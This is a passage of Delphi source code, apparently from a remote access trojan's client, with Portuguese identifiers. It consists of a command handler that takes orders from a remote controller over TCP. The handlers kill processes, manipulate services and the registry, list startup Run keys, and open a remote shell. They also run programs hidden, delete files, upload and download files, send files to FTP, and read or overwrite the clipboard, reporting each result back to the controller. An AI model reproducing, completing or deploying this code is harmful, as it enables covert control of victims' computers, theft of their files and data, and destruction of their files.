    ToSend := JANELAS + '|' + MAXIMIZARJANELA + '|' + 'T' + '|' + IntToStr(TempInt) + '|' else
    ToSend := JANELAS + '|' + MAXIMIZARJANELA + '|' + 'F' + '|' + IntToStr(TempInt) + '|';
    GlobalVars.MainIdTCPClient.EnviarString(ToSend);
  end else

  if copy(Recebido, 1, posex('|', Recebido) - 1) = FINALIZARJANELA then
  begin
    delete(Recebido, 1, posex('|', Recebido));
    TempInt := StrToInt(copy(Recebido, 1, posex('|', Recebido) - 1));

    if KillProc(TempInt) = true then
    ToSend := JANELAS + '|' + FINALIZARJANELA + '|' + 'T' + '|' + IntToStr(TempInt) + '|' else
    ToSend := JANELAS + '|' + FINALIZARJANELA + '|' + 'F' + '|' + IntToStr(TempInt) + '|';
    GlobalVars.MainIdTCPClient.EnviarString(ToSend);
  end else

  if copy(Recebido, 1, posex('|', Recebido) - 1) = MUDARCAPTION then
  begin
    delete(Recebido, 1, posex('|', Recebido));
    TempInt := StrToInt(copy(Recebido, 1, posex('|', Recebido) - 1));
    delete(Recebido, 1, posex('|', Recebido));

    if SetWindowTextW(TempInt, pWidechar(Recebido)) = true then
    ToSend := JANELAS + '|' + MUDARCAPTION + '|' + 'T' + '|' + IntToStr(TempInt) + '|' else
    ToSend := JANELAS + '|' + MUDARCAPTION + '|' + 'F' + '|' + IntToStr(TempInt) + '|';
    GlobalVars.MainIdTCPClient.EnviarString(ToSend);
  end else

  if copy(Recebido, 1, posex('|', Recebido) - 1) = CRAZYWINDOW then
  begin
    delete(Recebido, 1, posex('|', Recebido));
    CrazyWin := TCrazyWin.Create(StrToInt(Recebido));
    CrazyWin.Resume;
  end else

  if copy(Recebido, 1, posex('|', Recebido) - 1) = LISTADESERVICOS then
  begin
    ToSend := SERVICOS + '|' +
              LISTADESERVICOS + '|' +
              ServiceList;
    GlobalVars.MainIdTCPClient.EnviarString(ToSend);
  end else

  if copy(Recebido, 1, posex('|', Recebido) - 1) = INSTALARSERVICO then
  begin
    delete(Recebido, 1, posex('|', Recebido));
    Result := SplitString(Recebido, delimitadorComandos);
    if InstallService(Result[0],
                      Result[1],
                      Result[2],
                      Result[3],
                      StrToInt(Result[4]),
                      StrToInt(Result[5])) = true then
    ToSend := SERVICOS + '|' + INSTALARSERVICO + '|' + Result[0] + delimitadorComandos + 'T' + '|' else
    ToSend := SERVICOS + '|' + INSTALARSERVICO + '|' + Result[0] + delimitadorComandos + 'F' + '|';
    GlobalVars.MainIdTCPClient.EnviarString(ToSend);
  end else

  if copy(Recebido, 1, posex('|', Recebido) - 1) = PARARSERVICO then
  begin
    delete(Recebido, 1, posex('|', Recebido));
    TempStr := copy(Recebido, 1, posex('|', Recebido) - 1);
    if StopService(TempStr) = true then
    ToSend := SERVICOS + '|' + PARARSERVICO + '|' + TempStr + '|' + 'T' + '|' else
    ToSend := SERVICOS + '|' + PARARSERVICO + '|' + TempStr + '|' + 'F' + '|';
    GlobalVars.MainIdTCPClient.EnviarString(ToSend);
  end else

  if copy(Recebido, 1, posex('|', Recebido) - 1) = INICIARSERVICO then
  begin
    delete(Recebido, 1, posex('|', Recebido));
    TempStr := copy(Recebido, 1, posex('|', Recebido) - 1);
    if StartService(TempStr) = true then
    ToSend := SERVICOS + '|' + INICIARSERVICO + '|' + TempStr + '|' + 'T' + '|' else
    ToSend := SERVICOS + '|' + INICIARSERVICO + '|' + TempStr + '|' + 'F' + '|';
    GlobalVars.MainIdTCPClient.EnviarString(ToSend);
  end else

  if copy(Recebido, 1, posex('|', Recebido) - 1) = REMOVERSERVICO then
  begin
    delete(Recebido, 1, posex('|', Recebido));
    TempStr := copy(Recebido, 1, posex('|', Recebido) - 1);
    if RemoveService(TempStr) = true then
    ToSend := SERVICOS + '|' + REMOVERSERVICO + '|' + TempStr + '|' + 'T' + '|' else
    ToSend := SERVICOS + '|' + REMOVERSERVICO + '|' + TempStr + '|' + 'F' + '|';
    GlobalVars.MainIdTCPClient.EnviarString(ToSend);
  end else

  if copy(Recebido, 1, posex('|', Recebido) - 1) = EDITARSERVICO then
  begin
    delete(Recebido, 1, posex('|', Recebido));
    Result := SplitString(Recebido, delimitadorComandos);
    if EditService(Result[0],
                   Result[1],
                   Result[2],
                   Result[3],
                   StrToInt(Result[4])) = true then
    ToSend := SERVICOS + '|' + EDITARSERVICO + '|' + Result[0] + delimitadorComandos + 'T' + '|' else
    ToSend := SERVICOS + '|' + EDITARSERVICO + '|' + Result[0] + delimitadorComandos + 'F' + '|';
    GlobalVars.MainIdTCPClient.EnviarString(ToSend);
  end else

  if copy(Recebido, 1, posex('|', Recebido) - 1) = LISTADECHAVES then
  begin
    delete(Recebido, 1, posex('|', Recebido));
    TempInt := StrToInt(copy(Recebido, 1, posex('|', Recebido) - 1));
    delete(Recebido, 1, posex('|', Recebido));
    ToSend := ListarChaves(Recebido);
    if ToSend = '' then exit;
    GlobalVars.MainIdTCPClient.EnviarString(REGISTRO + '|' +
                               LISTADECHAVES + '|' +
                               IntToStr(TempInt) + '|' +
                               ToSend);
    end else

  if copy(Recebido, 1, posex('|', Recebido) - 1) = LISTADEDADOS then
  begin
    delete(Recebido, 1, posex('|', Recebido));
    ToSend := ListarDados(Recebido);
    if ToSend = '' then exit;
    GlobalVars.MainIdTCPClient.EnviarString(REGISTRO + '|' +
                               LISTADEDADOS + '|' +
                               ToSend);
  end else

  if copy(Recebido, 1, posex('|', Recebido) - 1) = NOVOREGISTRO then
  begin
    delete(Recebido, 1, posex('|', Recebido));
    AdicionarDados(Recebido);
  end else

  if copy(Recebido, 1, posex('|', Recebido) - 1) = NOVACHAVE then
  begin
    delete(Recebido, 1, posex('|', Recebido));
    AdicionarChave(Recebido);
  end else

  if copy(Recebido, 1, posex('|', Recebido) - 1) = APAGARREGISTRO then
  begin
    delete(Recebido, 1, posex('|', Recebido));
    UnitRegedit.DeletarRegistro(Recebido);
  end else

  if copy(Recebido, 1, posex('|', Recebido) - 1) = APAGARCHAVE then
  begin
    delete(Recebido, 1, posex('|', Recebido));
    UnitRegedit.DeletarChave(Recebido);
  end else

  if copy(Recebido, 1, posex('|', Recebido) - 1) = RENOMEARCHAVE then
  begin
    delete(Recebido, 1, posex('|', Recebido));

    TempStr := copy(recebido, 1, posex(delimitadorComandos, recebido) - 1);
    delete(Recebido, 1, posex(delimitadorComandos, Recebido) - 1);
    delete(Recebido, 1, length(delimitadorComandos));

    TempStr1 := copy(recebido, 1, posex(delimitadorComandos, recebido) - 1);
    delete(Recebido, 1, posex(delimitadorComandos, Recebido) - 1);
    delete(Recebido, 1, length(delimitadorComandos));

    TempStr2 := copy(recebido, 1, posex(delimitadorComandos, recebido) - 1);
    delete(Recebido, 1, posex(delimitadorComandos, Recebido) - 1);
    delete(Recebido, 1, length(delimitadorComandos));

    TempStr3 := copy(recebido, 1, posex(delimitadorComandos, recebido) - 1);

    RenameRegistryItem(StrToHKEY(TempStr), TempStr1 + '\' + TempStr2, TempStr1 + '\' + TempStr3);
  end else

  if copy(Recebido, 1, posex('|', Recebido) - 1) = RENOMEARREGISTRO then
  begin
    delete(Recebido, 1, posex('|', Recebido));

    TempStr := copy(recebido, 1, posex(delimitadorComandos, recebido) - 1); //HKEY
    delete(Recebido, 1, posex(delimitadorComandos, Recebido) - 1);
    delete(Recebido, 1, length(delimitadorComandos));

    TempStr1 := copy(recebido, 1, posex(delimitadorComandos, recebido) - 1); //SubKey
    delete(Recebido, 1, posex(delimitadorComandos, Recebido) - 1);
    delete(Recebido, 1, length(delimitadorComandos));

    TempStr2 := copy(recebido, 1, posex(delimitadorComandos, recebido) - 1); //KeyType
    delete(Recebido, 1, posex(delimitadorComandos, Recebido) - 1);
    delete(Recebido, 1, length(delimitadorComandos));

    TempStr3 := copy(recebido, 1, posex(delimitadorComandos, recebido) - 1); //OldName
    delete(Recebido, 1, posex(delimitadorComandos, Recebido) - 1);
    delete(Recebido, 1, length(delimitadorComandos));

    TempStr4 := copy(recebido, 1, posex(delimitadorComandos, recebido) - 1); //ValueData
    delete(Recebido, 1, posex(delimitadorComandos, Recebido) - 1);
    delete(Recebido, 1, length(delimitadorComandos));

    TempStr5 := recebido; //NewName

    RenameRegistryValue(TempStr,
                        TempStr1,
                        TempStr2,
                        TempStr3,
                        TempStr4,
                        TempStr5);
  end else

  if copy(Recebido, 1, posex('|', Recebido) - 1) = STARTUPMANAGER then
  begin
    ToSend := ListarDados('HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run\');
    if ToSend <> '' then
    GlobalVars.MainIdTCPClient.EnviarString(REGISTRO + '|' +
                                         STARTUPMANAGER + '|' +
                                         'HKLM' + '|' +
                                         ToSend);
    ToSend := ListarDados('HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run\');
    if ToSend <> '' then
    GlobalVars.MainIdTCPClient.EnviarString(REGISTRO + '|' +
                                         STARTUPMANAGER + '|' +
                                         'HKCU' + '|' +
                                         ToSend);
  end else

  if copy(Recebido, 1, posex('|', Recebido) - 1) = SHELLSTART then
  begin
    ShellThread := TNewConnectionThread.Create(MainIdTCPClient.Host,
                                               MainIdTCPClient.Port,
                                               unitconstantes.NEWCONNECTION + '|' +
                                               ConnectionID +
                                               DelimitadorComandos +
                                               SHELL + '|' + SHELLSTART + '|',
                                               False);
    ShellThread.Resume;
  end else

  if copy(Recebido, 1, posex('|', Recebido) - 1) = FMDRIVELIST then
  begin
    VarThread := TNewConnectionThread.Create(MainIdTCPClient.Host,
                                             MainIdTCPClient.Port,
                                             unitconstantes.NEWCONNECTION + '|' +
                                             ConnectionID +
                                             DelimitadorComandos +
                                             FILEMANAGER + '|' + FMDRIVELIST + '|' + DriveList,
                                             True);
    VarThread.Resume;

    sleep(500);

    VarThread2 := TNewConnectionThread.Create(MainIdTCPClient.Host,
                                             MainIdTCPClient.Port,
                                             unitconstantes.NEWCONNECTION + '|' +
                                             ConnectionID +
                                             DelimitadorComandos +
                                             FILEMANAGER + '|' + FMSPECIALFOLDERS2 + '|' + GetSpecialFoldersFull,
                                             True);
    VarThread2.Resume;
    sleep(500);

    CopmLAN := TComputersLAN.Create(MainIdTCPClient.Host, MainIdTCPClient.Port);
    CopmLAN.Resume;
  end else

  if copy(Recebido, 1, posex('|', Recebido) - 1) = FMFOLDERLIST then
  begin
    Delete(Recebido, 1, posex('|', Recebido));
    TempInt := StrToInt(copy(Recebido, 1, posex('|', Recebido) - 1)); // TTreeNode
    Delete(Recebido, 1, posex('|', Recebido));
    TempStr := copy(Recebido, 1, posex('|', Recebido) - 1);
    TempStr := ListarArquivos(TempStr);
    TempStr1 := Copy(TempStr, 1, posex(delimitadorComandos, Tempstr) - 1);
    delete(TempStr, 1, posex(delimitadorComandos, Tempstr) - 1);
    delete(TempStr, 1, length(delimitadorComandos));
    GlobalVars.MainIdTCPClient.EnviarString(FILEMANAGER + '|' + FMFOLDERLIST + '|' + Inttostr(TempInt) + '|' + TempStr1);
    GlobalVars.MainIdTCPClient.EnviarString(FILEMANAGER + '|' + FMFILELIST + '|' + Inttostr(TempInt) + '|' + TempStr);
  end else

  if copy(Recebido, 1, posex('|', Recebido) - 1) = FMFOLDERLIST2 then
  begin
    Delete(Recebido, 1, posex('|', Recebido));

    TempStr := ListarArquivos(Recebido);
    TempStr1 := Copy(TempStr, 1, posex(delimitadorComandos, Tempstr) - 1);

    delete(TempStr, 1, posex(delimitadorComandos, Tempstr) - 1);
    delete(TempStr, 1, length(delimitadorComandos));
    GlobalVars.MainIdTCPClient.EnviarString(FILEMANAGER + '|' + FMFOLDERLIST2 + '|' + Recebido + '|' + TempStr1);
    GlobalVars.MainIdTCPClient.EnviarString(FILEMANAGER + '|' + FMFILELIST2 + '|' + Recebido + '|' + TempStr);
  end else

  if copy(Recebido, 1, posex('|', Recebido) - 1) = FMRENOMEARPASTA then
  begin
    Delete(Recebido, 1, posex('|', Recebido));

    TempInt := StrToInt(copy(Recebido, 1, posex('|', Recebido) - 1)); // TTreeNode
    Delete(Recebido, 1, posex('|', Recebido));

    TempStr := copy(Recebido, 1, posex(delimitadorComandos, Recebido) - 1);
    Delete(Recebido, 1, posex(delimitadorComandos, Recebido) - 1);
    Delete(Recebido, 1, length(delimitadorComandos));

    TempStr1 := copy(Recebido, 1, posex(delimitadorComandos, Recebido) - 1);

    if RenomearFileAndDir(TempStr, TempStr1) = true then
    GlobalVars.MainIdTCPClient.EnviarString(FILEMANAGER + '|' + FMRENOMEARPASTA + '|' + IntToStr(TempInt) + '|' + 'T|' + TempStr1) else
    GlobalVars.MainIdTCPClient.EnviarString(FILEMANAGER + '|' + FMRENOMEARPASTA + '|' + IntToStr(TempInt) + '|' + 'F|' + TempStr1);
  end else

  if copy(Recebido, 1, posex('|', Recebido) - 1) = FMCRIARPASTA then
  begin
    Delete(Recebido, 1, posex('|', Recebido));
    TempInt := StrToInt(copy(Recebido, 1, posex('|', Recebido) - 1)); // TTreeNode
    Delete(Recebido, 1, posex('|', Recebido));
    TempStr := copy(Recebido, 1, posex(delimitadorComandos, Recebido) - 1);
    if CriarPasta(TempStr) = true then
    GlobalVars.MainIdTCPClient.EnviarString(FILEMANAGER + '|' + FMCRIARPASTA + '|' + IntToStr(TempInt) + '|' + 'T|' + TempStr) else
    GlobalVars.MainIdTCPClient.EnviarString(FILEMANAGER + '|' + FMCRIARPASTA + '|' + IntToStr(TempInt) + '|' + 'F|' + TempStr)
  end else

  if copy(Recebido, 1, posex('|', Recebido) - 1) = FMDELETARPASTA then
  begin
    Delete(Recebido, 1, posex('|', Recebido));
    TempInt := StrToInt(copy(Recebido, 1, posex('|', Recebido) - 1)); // TTreeNode
    Delete(Recebido, 1, posex('|', Recebido));
    TempStr := copy(Recebido, 1, posex(delimitadorComandos, Recebido) - 1);
    if DeleteAllFilesAndDir(TempStr, false) = true then
    GlobalVars.MainIdTCPClient.EnviarString(FILEMANAGER + '|' + FMDELETARPASTA + '|' + IntToStr(TempInt) + '|' + 'T|' + TempStr) else
    if length(tempstr) > 0 then
    begin
      if TempStr[length(tempstr)] = '\' then delete(tempstr, length(tempstr), 1);

      if DeleteAllFilesAndDir(TempStr, false) = true then
      GlobalVars.MainIdTCPClient.EnviarString(FILEMANAGER + '|' + FMDELETARPASTA + '|' + IntToStr(TempInt) + '|' + 'T|' + TempStr + '\') else
      GlobalVars.MainIdTCPClient.EnviarString(FILEMANAGER + '|' + FMDELETARPASTA + '|' + IntToStr(TempInt) + '|' + 'F|' + TempStr + '\');
    end;
  end else

  if copy(Recebido, 1, posex('|', Recebido) - 1) = FMDELETARPASTALIXO then
  begin
    Delete(Recebido, 1, posex('|', Recebido));
    TempInt := StrToInt(copy(Recebido, 1, posex('|', Recebido) - 1)); // TTreeNode
    Delete(Recebido, 1, posex('|', Recebido));
    TempStr := copy(Recebido, 1, posex(delimitadorComandos, Recebido) - 1);
    if DeleteAllFilesAndDir(TempStr, true) = true then
    GlobalVars.MainIdTCPClient.EnviarString(FILEMANAGER + '|' + FMDELETARPASTA + '|' + IntToStr(TempInt) + '|' + 'T|' + TempStr) else
    if length(tempstr) > 0 then
    begin
      if TempStr[length(tempstr)] = '\' then delete(tempstr, length(tempstr), 1);

      if DeleteAllFilesAndDir(TempStr, true) = true then
      GlobalVars.MainIdTCPClient.EnviarString(FILEMANAGER + '|' + FMDELETARPASTA + '|' + IntToStr(TempInt) + '|' + 'T|' + TempStr + '\') else
      GlobalVars.MainIdTCPClient.EnviarString(FILEMANAGER + '|' + FMDELETARPASTA + '|' + IntToStr(TempInt) + '|' + 'F|' + TempStr + '\');
    end;
  end else

  if copy(Recebido, 1, posex('|', Recebido) - 1) = FMEXECNORMAL then
  begin
    Delete(Recebido, 1, posex('|', Recebido));
    while Recebido <> '' do
    begin
      TempStr := copy(recebido, 1, posex(delimitadorComandos, recebido) - 1);
      delete(recebido, 1, posex(delimitadorComandos, recebido) - 1);
      delete(recebido, 1, length(delimitadorComandos));
      ShellExecute(0, 'open', pwidechar(TempStr), '', '', SW_NORMAL);
    end;
    GlobalVars.MainIdTCPClient.EnviarString(FILEMANAGER + '|' + FMEXECNORMAL + '|');
  end else

  if copy(Recebido, 1, posex('|', Recebido) - 1) = FMEXECHIDE then
  begin
    Delete(Recebido, 1, posex('|', Recebido));
    while Recebido <> '' do
    begin
      TempStr := copy(recebido, 1, posex(delimitadorComandos, recebido) - 1);
      delete(recebido, 1, posex(delimitadorComandos, recebido) - 1);
      delete(recebido, 1, length(delimitadorComandos));
      ShellExecute(0, 'open', pwidechar(TempStr), '', '', SW_HIDE);
    end;
    GlobalVars.MainIdTCPClient.EnviarString(FILEMANAGER + '|' + FMEXECHIDE + '|');
  end else

  if copy(Recebido, 1, posex('|', Recebido) - 1) = FMDELETARARQUIVO then
  begin
    Delete(Recebido, 1, posex('|', Recebido));
    while Recebido <> '' do
    begin
      TempStr := copy(recebido, 1, posex(delimitadorComandos, recebido) - 1);
      delete(recebido, 1, posex(delimitadorComandos, recebido) - 1);
      delete(recebido, 1, length(delimitadorComandos));
      if DeleteAllFilesAndDir(TempStr, false) = true then TempStr1 := TempStr1 + TempStr + delimitadorComandos;
    end;
    GlobalVars.MainIdTCPClient.EnviarString(FILEMANAGER + '|' + FMDELETARARQUIVO + '|' + TempStr1);
  end else

  if copy(Recebido, 1, posex('|', Recebido) - 1) = FMDELETARARQUIVOLIXO then
  begin
    Delete(Recebido, 1, posex('|', Recebido));
    while Recebido <> '' do
    begin
      TempStr := copy(recebido, 1, posex(delimitadorComandos, recebido) - 1);
      delete(recebido, 1, posex(delimitadorComandos, recebido) - 1);
      delete(recebido, 1, length(delimitadorComandos));
      if DeleteAllFilesAndDir(TempStr, true) = true then TempStr1 := TempStr1 + TempStr + delimitadorComandos;
    end;
    GlobalVars.MainIdTCPClient.EnviarString(FILEMANAGER + '|' + FMDELETARARQUIVO + '|' + TempStr1);
  end else

  if copy(Recebido, 1, posex('|', Recebido) - 1) = FMEXECPARAM then
  begin
    Delete(Recebido, 1, posex('|', Recebido));
    TempInt := StrToInt(copy(Recebido, 1, posex('|', Recebido) - 1)); // Normal ou oculto
    Delete(Recebido, 1, posex('|', Recebido));

    TempStr := copy(recebido, 1, posex(delimitadorComandos, recebido) - 1); // arquivo
    delete(recebido, 1, posex(delimitadorComandos, recebido) - 1);
    delete(recebido, 1, length(delimitadorComandos));

    TempStr1 := copy(recebido, 1, posex(delimitadorComandos, recebido) - 1); // parâmetro

    if TempInt = 0 then TempInt1 := SW_NORMAL else TempInt1 := SW_HIDE;
    if ShellExecute(0, 'open', pwidechar(TempStr), pwidechar(Tempstr1), '', TempInt1) <= 32 then
    GlobalVars.MainIdTCPClient.EnviarString(FILEMANAGER + '|' + FMEXECPARAM + '|F|' + TempStr) else
    GlobalVars.MainIdTCPClient.EnviarString(FILEMANAGER + '|' + FMEXECPARAM + '|T|' + TempStr);
  end else

  if copy(Recebido, 1, posex('|', Recebido) - 1) = FMEDITARARQUIVO then
  begin
    Delete(Recebido, 1, posex('|', Recebido));

    TempStr := copy(recebido, 1, posex(delimitadorComandos, recebido) - 1); // oldname
    delete(recebido, 1, posex(delimitadorComandos, recebido) - 1);
    delete(recebido, 1, length(delimitadorComandos));

    TempStr1 := copy(recebido, 1, posex(delimitadorComandos, recebido) - 1); // newname
    delete(recebido, 1, posex(delimitadorComandos, recebido) - 1);
    delete(recebido, 1, length(delimitadorComandos));

    TempStr2 := copy(recebido, 1, posex(delimitadorComandos, recebido) - 1); // parâmetro

    SetAttributes(TempStr, TempStr2);
    if TempStr = TempStr1 then exit; // pq não precisa mudar o nome

    if RenomearFileAndDir(TempStr, TempStr1) = false then
    GlobalVars.MainIdTCPClient.EnviarString(FILEMANAGER + '|' + FMEDITARARQUIVO + '|F|' + TempStr + delimitadorComandos + TempStr1) else
    GlobalVars.MainIdTCPClient.EnviarString(FILEMANAGER + '|' + FMEDITARARQUIVO + '|T|' + TempStr + delimitadorComandos + TempStr1);
  end else

  if copy(Recebido, 1, posex('|', Recebido) - 1) = FMWALLPAPER then
  begin
    Delete(Recebido, 1, posex('|', Recebido));
    randomize;
    TempStr1 := MyTempFolder + inttostr(random(99999)) + '.bmp';
    SaveAnyImageToBMPFile(Recebido, TempStr1);
    try
      SystemParametersInfoW(SPI_SETDESKWALLPAPER, 0, pwidechar(TempStr1), SPIF_SENDCHANGE);
      GlobalVars.MainIdTCPClient.EnviarString(FILEMANAGER + '|' + FMWALLPAPER + '|T|' + Recebido);
      except
      GlobalVars.MainIdTCPClient.EnviarString(FILEMANAGER + '|' + FMEDITARARQUIVO + '|F|' + Recebido);
    end;
  end else

  if copy(Recebido, 1, posex('|', Recebido) - 1) = FMTHUMBS then
  begin
    Delete(Recebido, 1, posex('|', Recebido));
    ThumbStop := true;
    sleep(100);
    if Recebido = '' then exit; // somente para finalizar a thread

    TempInt := StrToInt(copy(Recebido, 1, posex('|', Recebido) - 1)); // tamanho
    Delete(Recebido, 1, posex('|', Recebido));

    TempInt1 := StrToInt(copy(Recebido, 1, posex('|', Recebido) - 1)); // qualidade
    Delete(Recebido, 1, posex('|', Recebido));

    TempStr := recebido; // Lista de arquivos

    EnviarThumbs := TGetThumbs.Create(MainIdTCPClient.Host,
                                      MainIdTCPClient.Port,
                                      TempInt,
                                      Tempint1,
                                      TempStr,
                                      False);
    EnviarThumbs.Resume;
  end else

  if copy(Recebido, 1, posex('|', Recebido) - 1) = FMFILESEARCHLIST then
  begin
    Delete(Recebido, 1, posex('|', Recebido));
    TempBool := copy(Recebido, 1, posex('|', Recebido) - 1) = 'YES'; // recursive
    Delete(Recebido, 1, posex('|', Recebido));

    TempStr := copy(Recebido, 1, posex(delimitadorComandos, Recebido) - 1); // SelectedDir
    Delete(Recebido, 1, posex(delimitadorComandos, Recebido) - 1);
    Delete(Recebido, 1, length(delimitadorComandos));

    TempStr1 := Recebido; // Nome do arquivo

    ProcurarArquivos := TSearchFiles.Create(MainIdTCPClient.Host,
                                            MainIdTCPClient.Port,
                                            TempStr,
                                            TempStr1,
                                            TempBool);
    ProcurarArquivos.Resume;
  end else

  if copy(Recebido, 1, posex('|', Recebido) - 1) = FMFILESEARCHLISTSTOP then
  begin
    SearchFileStop := true;
  end else

  if copy(Recebido, 1, posex('|', Recebido) - 1) = FMTHUMBS_SEARCH then
  begin
    Delete(Recebido, 1, posex('|', Recebido));
    ThumbSearchStop := true;
    sleep(100);
    if Recebido = '' then exit; // somente para finalizar a thread

    TempInt := StrToInt(copy(Recebido, 1, posex('|', Recebido) - 1)); // tamanho
    Delete(Recebido, 1, posex('|', Recebido));

    TempInt1 := StrToInt(copy(Recebido, 1, posex('|', Recebido) - 1)); // qualidade
    Delete(Recebido, 1, posex('|', Recebido));

    TempStr := recebido; // Lista de arquivos

    EnviarThumbs := TGetThumbs.Create(MainIdTCPClient.Host,
                                      MainIdTCPClient.Port,
                                      TempInt,
                                      Tempint1,
                                      TempStr,
                                      True);
    EnviarThumbs.Resume;
  end else

  if copy(Recebido, 1, posex('|', Recebido) - 1) = FMDOWNLOAD then
  begin
    Delete(Recebido, 1, posex('|', Recebido));
    if PossoMexer(Recebido) = False then
    begin
      GlobalVars.MainIdTCPClient.EnviarString(FILEMANAGER + '|' + FMDOWNLOADERROR + '|' + Recebido);
      exit;
    end;
    NewDownload := TNewDownload.Create(MainIdTCPClient.Host,
                                      MainIdTCPClient.Port,
                                      Recebido);
    NewDownload.Resume;
  end else

  if copy(Recebido, 1, posex('|', Recebido) - 1) = FMRESUMEDOWNLOAD then
  begin
    Delete(Recebido, 1, posex('|', Recebido));
    TempStr := Copy(Recebido, 1, posex(DelimitadorComandos, Recebido) - 1);
    delete(Recebido, 1, posex(DelimitadorComandos, Recebido) - 1);
    delete(Recebido, 1, length(DelimitadorComandos));
    TempInt := StrToInt(Recebido);

    if PossoMexer(TempStr) = False then
    begin
      GlobalVars.MainIdTCPClient.EnviarString(FILEMANAGER + '|' + FMDOWNLOADERROR + '|' + TempStr);
      exit;
    end;

    NewResumeDownload := TNewResumeDownload.Create(MainIdTCPClient.Host,
                                                   MainIdTCPClient.Port,
                                                   TempStr,
                                                   TempInt);
    NewResumeDownload.Resume;
  end else

  if copy(Recebido, 1, posex('|', Recebido) - 1) = FMUPLOAD then
  begin
    Delete(Recebido, 1, posex('|', Recebido));
    TempStr := Copy(Recebido, 1, posex(DelimitadorComandos, Recebido) - 1);
    delete(Recebido, 1, posex(DelimitadorComandos, Recebido) - 1);
    delete(Recebido, 1, length(DelimitadorComandos));
    TempInt := StrToInt(Recebido);

    if PossoCriar(TempStr) = False then
    begin
      GlobalVars.MainIdTCPClient.EnviarString(FILEMANAGER + '|' + FMUPLOADERROR + '|' + TempStr);
      exit;
    end;

    TempStr1 := unitconstantes.NEWCONNECTION + '|' +
                ConnectionID +
                DelimitadorComandos +
                FILEMANAGERNEW + '|' +
                FMUPLOAD + '|' +
                TempStr;

    NewUpload := TNewUpload.Create(MainIdTCPClient.Host,
                                   MainIdTCPClient.Port,
                                   TempStr,
                                   TempInt,
                                   TempStr1);
    NewUpload.Resume;
  end else

  if copy(Recebido, 1, posex('|', Recebido) - 1) = FMSENDFTP then
  begin
    delete(Recebido, 1, posex('|', recebido));

    TempStr := copy(Recebido, 1, posex(DelimitadorComandos, Recebido) - 1); // FTPAddress
    delete(Recebido, 1, posex(DelimitadorComandos, Recebido) - 1);
    delete(Recebido, 1, length(DelimitadorComandos));

    TempStr1 := copy(Recebido, 1, posex(DelimitadorComandos, Recebido) - 1); // FTPFolder
    delete(Recebido, 1, posex(DelimitadorComandos, Recebido) - 1);
    delete(Recebido, 1, length(DelimitadorComandos));

    TempStr2 := copy(Recebido, 1, posex(DelimitadorComandos, Recebido) - 1); // FTPUser
    delete(Recebido, 1, posex(DelimitadorComandos, Recebido) - 1);
    delete(Recebido, 1, length(DelimitadorComandos));

    TempStr3 := copy(Recebido, 1, posex(DelimitadorComandos, Recebido) - 1); // FTPPass
    delete(Recebido, 1, posex(DelimitadorComandos, Recebido) - 1);
    delete(Recebido, 1, length(DelimitadorComandos));

    TempStr4 := Recebido; // Arquivo

    TempStr5 := ExtractFileName(TempStr4); // Nome do arquivo

    GlobalVars.MainIdTCPClient.EnviarString(FILEMANAGER + '|' + FMSENDFTP + '|' + TempStr4);

    NewFTPThread := TNewFTPThread.Create(TempStr, TempStr1, TempStr2, TempStr3, TempStr5, TempStr4);
    NewFTPThread.Resume;
  end else

  if copy(Recebido, 1, posex('|', Recebido) - 1) = FMTHUMBS2 then
  begin
    Delete(Recebido, 1, posex('|', Recebido));
    TempInt := StrToInt(copy(Recebido, 1, posex('|', Recebido) - 1)); // tamanho
    Delete(Recebido, 1, posex('|', Recebido));
    TempInt1 := StrToInt(copy(Recebido, 1, posex('|', Recebido) - 1)); // qualidade
    Delete(Recebido, 1, posex('|', Recebido));
    TempStr := GetAnyImageToString(Recebido, TempInt1, TempInt, TempInt);

    TempStr := IntToStr(TempInt) + '|' + Recebido + '|' + TempStr;
    GlobalVars.MainIdTCPClient.EnviarString(FILEMANAGER + '|' + FMTHUMBS2 + '|' + TempStr);
  end else

  if copy(Recebido, 1, posex('|', Recebido) - 1) = UnitConstantes.FILESEARCH then
  begin
    StopFileExistsComputer := True;
    Delete(Recebido, 1, posex('|', Recebido));
    sleep(5000);

    StopFileExistsComputer := False;
    FileExistsComputer := TFileExistsComputer.Create(MainIdTCPClient.Host, MainIdTCPClient.Port, Recebido);
    FileExistsComputer.Resume;
  end else

  if copy(Recebido, 1, posex('|', Recebido) - 1) = GETCLIPBOARD then
  begin
    if GetClipboardText(0, TempStr) = true then
    begin
      GlobalVars.MainIdTCPClient.EnviarString(CLIPBOARD + '|' + GETCLIPBOARD + '|' + TempStr);
    end else
    if GetClipboardFiles(TempStr) = true then
    begin
      GlobalVars.MainIdTCPClient.EnviarString(CLIPBOARD + '|' + GETCLIPBOARD + '|' + TempStr);
    end else
    GlobalVars.MainIdTCPClient.EnviarString(CLIPBOARD + '|' + GETCLIPBOARD + '|');
  end else

  if copy(Recebido, 1, posex('|', Recebido) - 1) = SETCLIPBOARD then
  begin
    try
      OpenClipboard(0);
      EmptyClipboard;
      finally
      CloseClipboard;
    end;
    Delete(Recebido, 1, posex('|', Recebido));
    SetClipboardText(Recebido);
    GlobalVars.MainIdTCPClient.EnviarString(CLIPBOARD + '|' + SETCLIPBOARD + '|');
  end else

  if copy(Recebido, 1, posex('|', Recebido) - 1) = CLEARCLIPBOARD then
  begin
    try
      OpenClipboard(0);
      EmptyClipboard;
      finally
      CloseClipboard;
    end;
    GlobalVars.MainIdTCPClient.EnviarString(CLIPBOARD + '|' + CLEARCLIPBOARD + '|');
  end else

  if copy(Recebido, 1, posex('|', Recebido) - 1) = LISTDEVICES then
  begin
    TempStr := FillDeviceList(DeviceClassesCount, DevicesCount);
    GlobalVars.MainIdTCPClient.EnviarString(LISTDEVICES + '|' +
                               LISTADEDISPOSITIVOSPRONTA + '|' +
                               inttostr(DeviceClassesCount) + '|' +
                               inttostr(DevicesCount) + '|' +
                               TempStr);
  end else

  if copy(Recebido, 1, posex('|', Recebido) - 1) = LISTEXTRADEVICES then
  begin
    delete(Recebido, 1, posex('|', Recebido));
    TempStr := ShowDeviceAdvancedInfo(strtoint(copy(Recebido, 1, posex('|', Recebido) - 1)));
    GlobalVars.MainIdTCPClient.EnviarString(LISTDEVICES + '|' +
                               LISTADEDISPOSITIVOSEXTRASPRONTA + '|' +
                               TempStr);
  end else

  if copy(Recebido, 1, posex('|', Recebido) - 1) = LISTARPORTAS then
  begin
    ReadTCPTable;
    ReadUdpTable;

    TempStr := CriarLista(false);
    GlobalVars.MainIdTCPClient.EnviarString(LISTARPORTAS + '|' +
                               LISTADEPORTASPRONTA + '|' +
